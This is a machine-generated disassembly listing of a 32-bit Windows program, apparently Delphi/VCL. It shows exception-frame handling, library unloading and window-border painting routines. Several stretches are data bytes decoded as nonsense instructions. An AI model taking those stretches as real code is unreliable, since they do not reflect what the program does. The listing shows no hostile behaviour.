call sub_457a18
lea eax [ eax + eax * 2 ]
test eax eax
jns r-xdata
add eax 0x3
sar eax 0x2
pop edx
call sub_4240b0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_453750
add eax 0x3
sub_42ed54
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_42ed9f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_423a68
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x60 ]
call sub_404260
sete al
xor al 0x1
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42eda6
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_42edac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42edd1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42edd8
retn
sub_42edf3
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42ee38
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ee3f
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_4048dc
sub_42ee5b
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push j_sub_403858#9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42eea7
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_4048dc
sub_42eeb7
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403858#8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ef14
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_403e54
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42ef20
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ef64
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ef6b
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42ef78
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403858#7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42efa4
retn
sub_42efb0
cld
out dx eax
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi * 8 ] al
inc edx
add [ eax + eax ] al
add [ eax ] al
mov al [ 0x4c004010 ]
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xf4004030
xor [ eax ] al
mov al dh
inc edx
add [ eax + esi * 8 + 0x540b0042 ] bl
inc ebx
outsd
outsb
jbe r-xdata
jb r-xdata
insb
imul ebp [ edi + 0x6e ] r-xdata
push cs
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
insb
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
insb
jb r-xdata
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
imul ebp [ edi + 0x6e ] 0x6d726f46
popad
je r-xdata
add [ eax ] al
add [ eax - 0x1 ] dl
add eax [ eax ]
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
nop
push j_sub_403858#4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add bh bh
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f126
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404890
mov eax rw-data
mov edx [ r-xdata ]
call sub_404890
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42f0b0
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403858#4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f126
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404890
mov eax rw-data
mov edx [ r-xdata ]
call sub_404890
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42f378
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_426364
mov [ esi + 0x5 ] al
call sub_42f050
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_42fcf0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_42f3c4
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax esi
call sub_42f464
call sub_4261a4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_42f3f8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_42f464
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_42f4a8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42f3f8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42f4f8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42f3f8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_42f544
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42f3f8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42f588
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42f3f8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_42f5d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_42f3f8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_42f638
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_4046a0
push eax
mov eax esi
call sub_404690
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42f3f8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_42f69c
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42f720
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42f75c
mov [ ecx ] 0x12
xor eax eax
mov al dl
cmp eax 0x14
jge r-xdata
add eax 0xffffffec
sub eax 0x6
jb r-xdata
add eax 0xfffffffe
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x14
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x6
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x5
mov eax 0x1a
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x8
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x20
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xe
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42f7f8
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_42f815 ]
jmp [ eax * 4 + jump_table_42f87e ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_42fb84
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_42fcdf
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_42f720
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_42f544
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_412938
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_42fd0c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42fd47
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fd4e
retn
mov eax [ rw-data ]
call sub_403104
mov eax rw-data
call sub_403e54
sub_42fd59
std
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x42fe ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2 ] dh
inc edx
add [ edx + 0x100042fe ] cl
add al [ eax ]
add al dh
push 0x9fc40043
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ eax - 0x63ffbc1a ] ah
xor [ eax ] al
mov eax 0x98004030
daa
inc esp
add [ eax + 0x16 ] al
inc esp
add [ eax - 0x22 ] ch
inc ebx
add [ eax ] ch
inc ebx
inc ecx
add ah bh
retn
sub_430d3c
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
popad
jbe r-xdata
dec ebp
outsd
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
adc [ ebx + 0x43 ] bl
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
push ebx
je r-xdata
or al 0x4f
outsb
dec ebp
outsd
jne r-xdata
mov esp 0xe0004356
add [ eax ] al
jmp eax
mov eax [ 0xffffffff9fdc0043 ]
je r-xdata
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xb0004030
mov al [ 0x33580041 ]
jb r-xdata
push cs
inc ebx
add [ eax + eax ] ch
add [ eax ] al
push eax
bound eax [ ebx ]
dec esp
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
dec esp
push cs
push esp
inc edx
jne r-xdata
add [ eax + 0x43 ] ah
add [ edi + ebx * 8 ] bl
inc ebx
add ah al
fiadd [ ebx ]
cmp al 0xb
inc esp
add [ ecx + ebp * 8 ] cl
inc ebx
add [ esp + ebx + 0x44 ] bh
add [ eax - 0x57ffbbf9 ] bh
or al [ eax + eax - 0x44 ]
xor al 0x43
add al ah
xor al 0x43
add [ eax + eax ] al
cmp [ ebp - 0x10ffec ] bh
fcos
pop esp
xor eax 0x35a80043
inc ebx
add [ esp + esi + 0x43 ] ch
add [ esp + esi + 0x540e0043 ] dh
inc ecx
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add [ eax ] bl
xor al 0x43
add [ ecx + edx + 0x44 ] dl
add [ eax + 0x16 ] dh
inc esp
add [ ebp + edx - 0x696fffbc ] bh
inc ebx
add al dl
or eax [ eax + eax - 0x10 ]
or eax [ eax + eax + 0x8 ]
or [ eax + eax - 0x28 ] eax
xchg ebp eax
inc ebx
add ah bl
xchg ebp eax
inc ebx
add ah cl
lds eax [ ebx ]
clc
lds eax [ ebx ]
sbb al 0xa1
inc ebx
add [ edi + edx * 4 + 0x43 ] dl
add [ eax + 0x200043a2 ] ch
mov [ 0xffffffffa5340043 ] al
inc ebx
add al ah
mov [ 0x34e40043 ] eax
inc ebx
add [ esi + eax * 8 + 0x43 ] bh
add [ ecx + ecx + 0x44 ] bl
add [ eax ] bl
or al [ eax + eax + 0x14 ]
add eax 0x9fc0044
inc esp
add [ ebx + ecx * 8 - 0x2dd7ffbd ] dl
inc ebx
add al cl
fild [ ebx ]
aam 0x35
inc ebx
add [ eax - 0x1fffbc24 ] dh
fiadd [ ebx ]
pushad
loopne r-xdata
inc ebx
add [ ecx ] dh
inc ebx
add ah bl
lahf
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xf40c08b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10 ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
adc [ ebx ] al
sub dl [ eax ]
inc ebx
add [ edx + eax ] cl
add [ eax ] al
hlt
inc ebx
add ah ah
mov al [ 0xffffffff92b00041 ]
inc ebx
add [ eax ] bl
mov eax [ 0xffffffff935c0041 ]
inc ebx
inc ecx
add [ eax + 0x33 ] bl
inc esp
outsd
arpl [ ebx + 0x8 ] bp
pop ecx
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
push ebx
je r-xdata
add [ eax - 0x63ffbc1a ] ah
je r-xdata
add [ eax - 0x60 ] ch
inc ecx
add ah bh
add [ ebx + edx * 4 + 0x43 ] bl
jb r-xdata
xor [ eax ] al
mov eax 0x78004030
leave
inc ebx
add [ eax + 0x16 ] al
inc esp
pushad
xor eax [ eax ]
mov al [ 0xffffffff9c0043e6 ]
outsb
inc ebx
outsd
outsb
je r-xdata
jl r-xdata
inc esp
jb r-xdata
outsd
insb
lea eax [ eax ]
inc eax
adc [ ebx ] al
pop es
push cs
push esp
inc edx
jne r-xdata
xchg ebx eax
inc ebx
add [ esp + edx * 4 ] ch
inc ebx
add [ eax ] bl
xchg ebx eax
inc ebx
add [ ecx + ebp * 2 + 0x44 ] bl
add [ eax + 0x69 ] ah
inc esp
add [ ebx + edx * 4 ] bh
inc ebx
add [ eax + edx * 4 + 0x54110043 ] ch
inc edx
jne r-xdata
imul eax [ eax + eax + 0x4c ] 0xec0043c8
inc ebx
add [ eax ] dl
xchg edx eax
inc ebx
add [ eax + ebp * 2 - 0x37bbffbc ] ch
inc ebx
add [ eax + 0x44004393 ] cl
xchg edx eax
inc ebx
add ah bh
push 0x69100044
inc esp
add [ edx + edx * 4 + 0x43 ] bh
add [ eax ] bh
imul eax [ eax + eax - 0x28 ] 0xb4004392
xor eax [ ebx ]
clc
xchg edx eax
inc ebx
add [ eax + 0x69 ] cl
inc esp
add [ eax + ecx * 8 + 0x43 ] cl
add ah ch
mov al [ 0xffffffffa1500041 ]
inc ecx
add [ ecx + edx * 4 + 0x337c0043 ] bl
push 0xfc0041a0
push cs
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ eax ] ch
inc ebx
inc ecx
add ah bh
je r-xdata
add [ eax - 0x22 ] ch
outsb
inc ebx
outsd
outsb
je r-xdata
retn
cld
outsd
insb
inc eax
cmovae eax [ eax ]
test al 0x67
inc ebx
add [ ebx ] cl
add [ eax ] cl
push ebx
je r-xdata
inc ebx
add [ eax + ebx * 4 ] bl
inc ebx
add [ ebx + ecx * 8 ] bl
inc ebx
add [ ecx ] dh
inc ebx
add ah bl
lahf
inc ecx
inc ebx
je r-xdata
dec eax
dec [ eax - 0x7ffbcc9 ]
aaa
inc ebx
add [ eax + edi + 0x43 ] bh
add [ edi + esi + 0x43 ] dh
add ah bh
cmp [ ebx ] al
sar [ eax ] 0x1
inc ebx
add [ eax + 0x36 ] dh
inc ebx
add [ esi + esi + 0x54070043 ] dl
inc edx
jne r-xdata
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add [ esi + esi ] cl
inc ebx
add [ ecx + edx + 0x44 ] dl
add [ eax + 0x16 ] dh
inc esp
add [ ebp + edx - 0x696fffbc ] bh
inc ebx
add al dl
or eax [ eax + eax - 0x10 ]
or eax [ eax + eax + 0x8 ]
or [ eax + eax - 0x28 ] eax
xchg ebp eax
inc ebx
add ah bl
xchg ebp eax
inc ebx
add ah cl
lds eax [ ebx ]
clc
lds eax [ ebx ]
sbb al 0xa1
inc ebx
add [ edi + edx * 4 + 0x43 ] dl
add [ eax + 0x200043a2 ] ch
mov [ 0xffffffffa5340043 ] al
inc ebx
add al ah
mov [ 0x34e40043 ] eax
inc ebx
add [ esi + eax * 8 + 0x43 ] bh
add [ ecx + ecx + 0x44 ] bl
add [ eax ] bl
or al [ eax + eax + 0x14 ]
add eax 0x9fc0044
inc esp
add [ ebx + ecx * 8 - 0x2dd7ffbd ] dl
inc ebx
add al cl
fild [ ebx ]
and [ edi ] dh
inc ebx
add [ eax + 0x5c0043dc ] dh
aaa
inc ebx
add [ eax - 0x20 ] ah
inc ebx
add [ eax + 0x43 ] ah
add [ edi + ebx * 8 ] bl
inc ebx
add ah al
fiadd [ ebx ]
cmp al 0xb
inc esp
add [ ecx + ebp * 8 ] cl
inc ebx
add [ esp + ebx + 0x44 ] bh
add [ eax - 0x57ffbbf9 ] bh
or al [ eax + eax - 0x44 ]
xor al 0x43
add al ah
xor al 0x43
add [ eax + 0x8004336 ] bl
add [ 0x7b006b0 ] al
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
